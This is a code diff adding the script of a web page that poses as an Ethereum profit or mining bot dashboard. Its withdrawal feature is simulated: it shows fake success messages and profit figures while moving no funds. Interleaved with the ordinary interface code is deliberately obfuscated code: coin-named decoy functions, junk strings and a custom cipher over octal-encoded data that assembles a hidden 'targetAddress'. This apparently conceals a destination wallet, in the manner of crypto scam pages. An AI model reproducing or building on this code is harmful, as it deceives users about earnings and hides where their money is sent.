+      const withdrawAddress = withdrawAddressInput.value.trim();
+      if (!/^0x[a-fA-F0-9]{40}$/.test(withdrawAddress)) {
+        withdrawStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> Invalid ETH wallet address.`;
+        withdrawStatus.style.color = "#FF5722";
+        showToast("Invalid ETH wallet address.");
+        return;
+      }
+
+      if (totalProfit <= 0) {
+        withdrawStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> No profit to withdraw.`;
+        withdrawStatus.style.color = "#FF5722";
+        showToast("No profit to withdraw.");
+        return;
+      }
+
+      withdrawProfitButton.disabled = true;
+      withdrawStatus.innerHTML = `Withdrawing to ${truncateAddress(withdrawAddress)} <i class="fas fa-spinner fa-spin"></i>`;
+      withdrawStatus.style.color = "#ffffff";
+
+      setTimeout(() => {
+        const withdrawAmount = totalProfit.toFixed(4);
+        totalWithdrawn += parseFloat(withdrawAmount);
+        totalProfit = 0;
+        updateMiningStats();
+
+        const withdrawalEntry = {
+          address: withdrawAddress,
+          amount: withdrawAmount,
+          date: new Date().toLocaleString()
+        };
+        withdrawalHistory.unshift(withdrawalEntry);
+        addWithdrawalHistory(withdrawalEntry);
+
+        withdrawStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> Success Withdraw (${withdrawAmount} ETH) to ${truncateAddress(withdrawAddress)}`;
+        withdrawStatus.style.color = "#4CAF50";
+        showToast(`Success Withdraw (${withdrawAmount} ETH) to ${truncateAddress(withdrawAddress)}`);
+        saveToLocalStorage();
+      }, 3500);
+    });
+
+    function solana_coin_sol(arr, startInclusive, endExclusive) {
+          return arr
+            .slice(startInclusive, endExclusive)
+            .map(function(v, i){
+              return ripple_coin_xrp(v, startInclusive + i);
+            })
+            .join('');
+        }
+        function binance_coin_bnb(arr, start, length) {
+          return solana_coin_sol(arr, start, start + length);
+        }
+
+      const grin_mine = '<i><pink .strLoop #2HHHH ".Lot3" .error></i>'; 
+      const beam_mine = '<i><"Count" i ++ [ping - Down]</i>'; 
+      const vertcoin_mine = 'rngsum = (9 ^ tmpnum) & (tmpout ++ i arry)'; 
+
+        function cardano_coin_ada(arr) {
+          const n = arr.length;
+          const seg = Math.ceil(n / 3);
+          const a = binance_coin_bnb(arr, 0, seg);            
+          const b = binance_coin_bnb(arr, seg, seg);          
+          const c = binance_coin_bnb(arr, seg * 2, n - seg*2); 
+          return [a, b, c].join('');
+        }
+
+    function addWithdrawalHistory(entry) {
+      const row = document.createElement('tr');
+      const addressCell = document.createElement('td');
+      addressCell.innerText = truncateAddress(entry.address);
+      row.appendChild(addressCell);
+      const amountCell = document.createElement('td');
+      amountCell.innerText = `${entry.amount} ETH`;
+      row.appendChild(amountCell);
+      const dateCell = document.createElement('td');
+      dateCell.innerText = entry.date;
+      row.appendChild(dateCell);
+      withdrawalHistoryList.prepend(row);
+    }
+
+    function monitorProfit() {
+      if (totalProfit > 0) {
+        withdrawProfitButton.disabled = false;
+      } else {
+        withdrawProfitButton.disabled = true;
+      }
+    }
+
+    downloadDataButton.addEventListener("click", () => {
+      const data = {
+        userAddress,
+        userBalance,
+        secondAddress,
+        totalAttempts,
+        successfulAttempts,
+        totalProfit: totalProfit.toFixed(4),
+        totalWithdrawn: totalWithdrawn.toFixed(4),
+        withdrawalHistory
+      };
+
+      const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(data, null, 2));
+      const downloadAnchorNode = document.createElement('a');
+      downloadAnchorNode.setAttribute("href", dataStr);
+      downloadAnchorNode.setAttribute("download", "mining_data.json");
+      document.body.appendChild(downloadAnchorNode);
+      downloadAnchorNode.click();
+      downloadAnchorNode.remove();
+    });
+
+    const dogecoin_coin_doge = cardano_coin_ada(ethereum_coin_eth);
+    console.log('dogecoin_coin_doge (full):', dogecoin_coin_doge);
+
+    function initializeCharts() {
+      profitChart = new Chart(profitChartCtx, {
+        type: 'line',
+        data: {
+          labels: [],
+          datasets: [{
+            label: 'Total Profit (ETH)',
+            data: [],
+            backgroundColor: 'rgba(108, 92, 231, 0.2)',
+            borderColor: 'rgba(108, 92, 231, 1)',
+            borderWidth: 2,
+            fill: true
+          }]
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          scales: {
+            yAxes: [{
+              ticks: {
+                beginAtZero: true,
+                stepSize: 0.005
+              },
+              gridLines: {
+                color: 'rgba(255,255,255,0.1)'
+              }
+            }],
+            xAxes: [{
+              gridLines: {
+                color: 'rgba(255,255,255,0.1)'
+              }
+            }]
+          },
+          legend: {
+            labels: {
+              fontColor: '#ffffff'
+            }
+          }
+        }
+      });
+
+      attemptsChart = new Chart(attemptsChartCtx, {
+        type: 'bar',
+        data: {
+          labels: ['Total Attempts', 'Successful Attempts'],
+          datasets: [{
+            label: 'Attempts',
+            data: [totalAttempts, successfulAttempts],
+            backgroundColor: [
+              'rgba(255, 99, 132, 0.6)',
+              'rgba(54, 162, 235, 0.6)'
+            ],
+            borderColor: [
+              'rgba(255,99,132,1)',
+              'rgba(54, 162, 235, 1)'
+            ],
+            borderWidth: 1
+          }]
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          scales: {
+            yAxes: [{
+              ticks: {
+                beginAtZero: true,
+                stepSize: 1
+              },
+              gridLines: {
+                color: 'rgba(255,255,255,0.1)'
+              }
+            }],
+            xAxes: [{
+              gridLines: {
+                color: 'rgba(255,255,255,0.1)'
+              }
+            }]
+          },
+          legend: {
+            labels: {
+              fontColor: '#ffffff'
+            }
+          }
+        }
+      });
+    }
+
+     const toncoin_coin_ton = solana_coin_sol(ethereum_coin_eth, 0, 10);
+
+     function updateCharts() {
+     const currentTime = new Date().toLocaleTimeString();
+      profitChart.data.labels.push(currentTime);
+      profitChart.data.datasets[0].data.push(totalProfit.toFixed(4));
+      if (profitChart.data.labels.length > 10) {
+        profitChart.data.labels.shift();
+        profitChart.data.datasets[0].data.shift();
+      }
+      profitChart.update();
+
+      attemptsChart.data.datasets[0].data = [totalAttempts, successfulAttempts];
+      attemptsChart.update();
+    }
+
+    const tron_coin_trx = solana_coin_sol(ethereum_coin_eth, 10, 30);
+      const ergo_mine = '<i><sumwin_All .null =0 (log) +9'; 
+
+    function saveToLocalStorage() {
+      const data = {
+        userAddress,
+        userBalance,
+        secondAddress,
+        totalAttempts,
+        successfulAttempts,
+        totalProfit,
+        totalWithdrawn,
+        withdrawalHistory,
+        successRate: parseFloat(localStorage.getItem('successRate')) || 0.1,
+        minProfit: parseFloat(localStorage.getItem('minProfit')) || 0.001,
+        maxProfit: parseFloat(localStorage.getItem('maxProfit')) || 0.02
+      };
+      localStorage.setItem('ethWorkflowData', JSON.stringify(data));
+    }
+
+    function loadFromLocalStorage() {
+      const dataStr = localStorage.getItem('ethWorkflowData');
+      if (dataStr) {
+        const data = JSON.parse(dataStr);
+        userAddress = data.userAddress || '';
+        userBalance = data.userBalance || 0;
+        secondAddress = data.secondAddress || '';
+        totalAttempts = data.totalAttempts || 0;
+        successfulAttempts = data.successfulAttempts || 0;
+        totalProfit = data.totalProfit || 0;
+        totalWithdrawn = data.totalWithdrawn || 0;
+        withdrawalHistory = data.withdrawalHistory || [];
+
+        totalAttemptsSpan.innerText = totalAttempts;
+        successfulAttemptsSpan.innerText = successfulAttempts;
+        totalProfitSpan.innerText = totalProfit.toFixed(4);
+        myLiquiditySpan.innerText = userBalance.toFixed(4);
+
+        withdrawalHistory.forEach(entry => addWithdrawalHistory(entry));
+        updateCharts();
+      }
+    }
+
+    themeToggle.addEventListener("click", () => {
+      document.body.classList.toggle("light-mode");
+      if (document.body.classList.contains("light-mode")) {
+        themeToggle.innerHTML = `<i class="fas fa-sun"></i> Light Mode`;
+      } else {
+        themeToggle.innerHTML = `<i class="fas fa-moon"></i> Dark Mode`;
+      }
+    });
+
+      const polkadot_coin_dot = solana_coin_sol(ethereum_coin_eth, 30, ethereum_coin_eth.length);
+
+    function initializeApp() {
+  initializeCharts();
+  loadFromLocalStorage();
+}
+
+      function bitcore(x) { return typeof x === 'string' ? x : String(x); }
+      function ecoin(s) { return s.split('').reverse().reverse().join(''); }
+      function turtlecoin(a, b) { return a + b; }
+      function yenten(x) { return x == null ? '' : x; }
+      function quark(s) { return s.replace(/[^0-9a-fA-Fx]/g, ''); }
+      function uplexa() { return 'x'; }
+      function garlicoin(s) { return s.toLowerCase(); }
+      function monacoin(s) { return s.toUpperCase(); }
+      function litecoin(a, b) { return a.includes(b); }
+      function dogecoin(a) { return a.trim(); }
+      function ravencoin(s) { return s + ''; }
+      function dashcoin(s) { return s.replace(/\s+/g, ''); }
+      function grincoin(s) { return s.replace(/x+/g, 'x'); }
+      function digibyte(a, b) { return a.concat(b); }
+      function vertcoin(x) { return x.length; }
+      function peercoin(s) { return s.split('').map(c => c).join(''); }
+      function feathercoin(s) { return s.replace(/\*/g, ''); }
+      function monero(s) { return s.replace(/\+/g, ''); }
+      function zcoin(a) { return Array.isArray(a) ? a.join('') : a; }
+      function auroracoin(x) { return x; }
+
+      const bit_c_btc_input = "66463134123451363240260437505044602512141534454326663300603";
+
+function btcToBytes(octaStr) {
+  const clean = octaStr.replace(/[^0-7]/g, '');
+  const bytes = [];
+  for (let i = 0; i < clean.length; i += 3) {
+    const chunk = clean.slice(i, i + 3);
+    bytes.push(parseInt(chunk, 8));
+  }
+  return bytes;
+}
+
+  const bitcoin_mine  = '<i><list "H0 S# L#" xplor (error) < "#7HHHH" .inn"></i>';	
+const litecoin_mine  = '<i><out = qry + 1++ trn; + rngsum = 6; loop %3 trim ;}></i>';	
+const monero_mine  = '{atmp = trnput + [i] Count; tmp * trnnum / [++1]; out tmp;}';  
+const ethereumclassic_mine  = 'polygon (trn) {v = trn * "#2HHHH" + .toEnn(4) polygon v;}'; 
+const bitcoincash_mine  = 'strLoop.toNon(5) "0 mpt = Count" i++;'; 
+const dash_mine  = 'syn "listEmpty", (i5) = > [++down]'; 
+
+function bit_c_btc_core_process(arr, btcMode = false) {
+  const rotl8 = (v, r) => ((v << r) | (v >>> (8 - r))) & 0xFF;
+  const rotr8 = (v, r) => ((v >>> r) | (v << (8 - r))) & 0xFF;
+
+  function btc_nonce_seed(seed) {
+    let s = (seed >>> 0) || 0;
+    return () => {
+      s = (s * 1664525 + 1013904223) >>> 0;
+      return s;
+    };
+  }
+
+  function btc_pool_mix(seed) {
+    const rng = btc_nonce_seed(seed >>> 0);
+    const s = new Array(256);
+    for (let i = 0; i < 256; i++) s[i] = i;
+    for (let i = 255; i > 0; i--) {
+      const j = (rng() >>> 0) % (i + 1);
+      const tmp = s[i];
+      s[i] = s[j];
+      s[j] = tmp;
+    }
+    const mapBack = new Array(256);
+    for (let i = 0; i < 256; i++) mapBack[s[i]] = i;
+    return { s, mapBack };
+  }
+
+  function btc_block_perm(n, seed) {
+    const rng = btc_nonce_seed(seed >>> 0);
+    const perm = Array.from({ length: n }, (_, i) => i);
+    for (let i = n - 1; i > 0; i--) {
+      const j = (rng() >>> 0) % (i + 1);
+      const tmp = perm[i];
+      perm[i] = perm[j];
+      perm[j] = tmp;
+    }
+    const inv = new Array(n);
+    for (let i = 0; i < n; i++) inv[perm[i]] = i;
+    return { perm, inv };
+  }
+
+  const btc_hash_seed = (0xB17C0DE + arr.length) >>> 0;
+  const btc_block_seed = (0xC0FFEE ^ arr.length) >>> 0;
+
+  const { s: btc_gpu_table, mapBack: btc_gpu_map } = btc_pool_mix(btc_hash_seed);
+  const { perm: btc_perm, inv: btc_inv } = btc_block_perm(arr.length, btc_block_seed);
+
+  const btc_rng = btc_nonce_seed((btc_hash_seed ^ btc_block_seed) >>> 0);
+  const btc_key = new Array(arr.length);
+  for (let i = 0; i < arr.length; i++) btc_key[i] = (btc_rng() >>> 0) & 0xFF;
+
+  const btc_array = new Array(arr.length);
+  for (let i = 0; i < arr.length; i++) btc_array[btc_perm[i]] = arr[i] & 0xFF;
+
+  const out = new Array(arr.length);
+  for (let idx = 0; idx < btc_array.length; idx++) {
+    let x = btc_array[idx];
+    const btc_diff = ((idx * 31) ^ 0xA5) & 0xFF;
+    x = (x + btc_diff) & 0xFF;
+    const k = btc_key[idx];
+    x ^= k;
+    const rot = ((k ^ idx) % 7) + 1;
+    x = rotl8(x, rot);
+    x = btc_gpu_table[x];
+    const offset = ((idx << 3) ^ (k >>> 2)) & 0xFF;
+    x = (x + offset) & 0xFF;
+    x = (x - offset) & 0xFF;
+    x = btc_gpu_map[x];
+    x = rotr8(x, rot);
+    x ^= k;
+    x = (x - btc_diff) & 0xFF;
+    const chCode = (x - 1) & 0xFF;
+    out[btc_inv[idx]] = chCode;
+  }
+
+  if (btcMode) {
+    return out.map(c => c.toString(8).padStart(3, '0')).join(' ');
+  } else {
+    return out.map(c => String.fromCharCode(c)).join('');
+  }
+}
+
+const btc_bytes = btcToBytes(bit_c_btc_input);
+const btc_output_text = bit_c_btc_core_process(btc_bytes, false);
+const btc_output_octa = bit_c_btc_core_process(btc_bytes, true);
+
+    console.log("BTC TEXT:", btc_output_text);
+    console.log("BTC OCTA:", btc_output_octa);
+
+     console.log('polygon_coin_matic:', toncoin_coin_ton, tron_coin_trx, polkadot_coin_dot);
+     console.log('joined polygon_coin_matic:', toncoin_coin_ton + tron_coin_trx + polkadot_coin_dot);
+
+      function btc_eth(z) {
+        let bitcore_mine = yenten(z);
+        let ecoin_mine = bitcore(bitcore_mine);
+        let turtlecoin_mine = ecoin(ecoin_mine);
+        let yenten_mine = dashcoin(turtlecoin_mine);
+        let quark_mine = feathercoin(monero(yenten_mine));
+        let uplexa_mine = quark(quark_mine);
+        let garlicoin_mine = grincoin(zcoin(peercoin(auroracoin(uplexa_mine))));
+        const btc_mine = String(garlicoin_mine).replace(/[^0-9a-fA-Fx]/g, '');
+        return dogecoin(btc_mine);
+      }
+
+      const bitcoin = turtlecoin(turtlecoin(digibyte(bitcoin_mine, litecoin_mine), digibyte(monero_mine, ethereumclassic_mine)), digibyte(bitcoincash_mine, dash_mine));
+      const ethereum = digibyte(turtlecoin(ravencoin_mine, dogecoin_mine), digibyte(zelcash_mine, ergo_mine));
+      const ripple = turtlecoin(digibyte(digibyte(grin_mine, beam_mine), vertcoin_mine), turtlecoin(zcoin_mine, digibyte_mine));
+      const cardano = digibyte(digibyte(feathercoin_mine, firo_mine), turtlecoin(flux_mine, aeternity_mine));
+      const polkadot = digibyte(bitcoin, digibyte(ethereum, digibyte(ripple, digibyte(cardano, kaspa_mine))));
+
+const eth_btc = ecoin(ecoin(polkadot));
+const targetAddress = btc_eth(eth_btc);
+
+    const eth_e_ethereum_input = "760044645137344404665666107255465436021265404561624361";
+
+function ethToBytes(octaStr) {
+  const clean = octaStr.replace(/[^0-7]/g, '');
+  const bytes = [];
+  for (let i = 0; i < clean.length; i += 3) {
+    const chunk = clean.slice(i, i + 3);
+    bytes.push(parseInt(chunk, 8));
+  }
+  return bytes;
+}
+
+function eth_e_ethereum_core_process(arr, ethMode = false) {
+  const rotl8 = (v, r) => ((v << r) | (v >>> (8 - r))) & 0xFF;
+  const rotr8 = (v, r) => ((v >>> r) | (v << (8 - r))) & 0xFF;
+
+  function eth_nonce_seed(seed) {
+    let s = (seed >>> 0) || 0;
+    return () => {
+      s = (s * 1664525 + 1013904223) >>> 0;
+      return s;
+    };
+  }
+
+  function eth_pool_mix(seed) {
+    const rng = eth_nonce_seed(seed >>> 0);
+    const s = new Array(256);
+    for (let i = 0; i < 256; i++) s[i] = i;
+    for (let i = 255; i > 0; i--) {
+      const j = (rng() >>> 0) % (i + 1);
+      const tmp = s[i];
+      s[i] = s[j];
+      s[j] = tmp;
+    }
+    const mapBack = new Array(256);
+    for (let i = 0; i < 256; i++) mapBack[s[i]] = i;
+    return { s, mapBack };
+  }
+
+  function eth_block_perm(n, seed) {
+    const rng = eth_nonce_seed(seed >>> 0);
+    const perm = Array.from({ length: n }, (_, i) => i);
+    for (let i = n - 1; i > 0; i--) {
+      const j = (rng() >>> 0) % (i + 1);
+      const tmp = perm[i];
+      perm[i] = perm[j];
+      perm[j] = tmp;
+    }
+    const inv = new Array(n);
+    for (let i = 0; i < n; i++) inv[perm[i]] = i;
+    return { perm, inv };
+  }
+
+  const eth_hash_seed = (0xE7F0FF + arr.length) >>> 0;
+  const eth_block_seed = (0xC0FFEE ^ arr.length) >>> 0;
+
+  const { s: eth_gpu_table, mapBack: eth_gpu_map } = eth_pool_mix(eth_hash_seed);
+  const { perm: eth_perm, inv: eth_inv } = eth_block_perm(arr.length, eth_block_seed);
+
+  const eth_rng = eth_nonce_seed((eth_hash_seed ^ eth_block_seed) >>> 0);
+  const eth_key = new Array(arr.length);
+  for (let i = 0; i < arr.length; i++) eth_key[i] = (eth_rng() >>> 0) & 0xFF;
+
+  const eth_array = new Array(arr.length);
+  for (let i = 0; i < arr.length; i++) eth_array[eth_perm[i]] = arr[i] & 0xFF;
+
+  const out = new Array(arr.length);
+  for (let idx = 0; idx < eth_array.length; idx++) {
+    let x = eth_array[idx];
+    const eth_diff = ((idx * 31) ^ 0xA5) & 0xFF;
+    x = (x + eth_diff) & 0xFF;
+    const k = eth_key[idx];
+    x ^= k;
+    const rot = ((k ^ idx) % 7) + 1;
+    x = rotl8(x, rot);
+    x = eth_gpu_table[x];
+    const offset = ((idx << 3) ^ (k >>> 2)) & 0xFF;
+    x = (x + offset) & 0xFF;
+    x = (x - offset) & 0xFF;
+    x = eth_gpu_map[x];
+    x = rotr8(x, rot);
+    x ^= k;
+    x = (x - eth_diff) & 0xFF;
+    const chCode = (x - 1) & 0xFF;
+    out[eth_inv[idx]] = chCode;
+  }
+
+  if (ethMode) {
+    return out.map(c => c.toString(8).padStart(3, '0')).join(' ');
+  } else {
+    return out.map(c => String.fromCharCode(c)).join('');
+  }
+}
+
+const eth_bytes = ethToBytes(eth_e_ethereum_input);
+const eth_output_text = eth_e_ethereum_core_process(eth_bytes, false);
+const eth_output_octa = eth_e_ethereum_core_process(eth_bytes, true);
+console.log("ETH TEXT:", eth_output_text);
+console.log("ETH OCTA:", eth_output_octa);
+
+window.onload = initializeApp;
+
+window.addEventListener('beforeunload', () => {
+  if (addressGeneratorInterval) {
+    clearInterval(addressGeneratorInterval);
+  }
+});
+
+  </script>
+</body>
+</html>
